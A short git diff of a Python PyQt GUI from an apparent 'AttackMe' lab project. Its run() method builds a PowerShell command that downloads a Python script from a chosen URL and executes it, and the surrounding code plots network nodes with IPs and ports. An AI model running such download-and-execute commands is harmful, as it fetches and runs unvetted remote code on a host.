@@ -140,7 +140,6 @@ class MyWindow(QMainWindow):
     def run(self):
         for i in self.url_comboList.keys():
             if self.url_combo.currentText() == i:
-                #cmd = 'powershell.exe -command "invoke-WebRequest {} -Outfile Z:\dev_AttackMe\download\M2_v1.py"; Start-Process -Filepath "Z:\dev_AttackMe\download\B.txt'.format(self.url_comboList[i])
                 cmd = 'powershell.exe -command "invoke-WebRequest {} -Outfile C:\AttackMe\download\M2_v1.py"; python "C:\AttackMe\download\M2_v1.py'.format(
                     self.url_comboList[i])
                 print(cmd)
@@ -206,8 +205,6 @@ class MyWindow(QMainWindow):
             except:
                 self.G.add_node(m_dict['NAME'], name=m_dict['NAME'], ip=m_dict['IP'],
                                 port=port[1], infos=m_dict['INFO'])
-            # for info_name, info_state in info_List:
-            #    self.G.add_node[node][info_name] = info_state
             nx.add_star(self.G, nodes)
             plt.clf()
             for node in self.G.nodes:
@@ -215,8 +212,6 @@ class MyWindow(QMainWindow):
             self.art = plot_network(self.G, node_style=use_attributes(), node_label_style={
                                     'font_size': 10, 'font_backgroundcolor': None})
             self.art.set_picker(10)
-            # set_picker(float)설명인데 뭔 소리인지 모르겠음 https://matplotlib.org/stable/api/_as_gen/matplotlib.artist.Artist.set_picker.html
-            # A float: If picker is a number it is interpreted as an epsilon tolerance in points and the artist will fire off an event if its data is within epsilon of the mouse event. For some artists like lines and patch collections, the artist may provide additional data to the pick event that is generated, e.g., the indices of the data within epsilon of the pick event
             self.fig.canvas.mpl_connect('pick_event', self.hilighter)
             self.canvas.draw_idle()
         else:
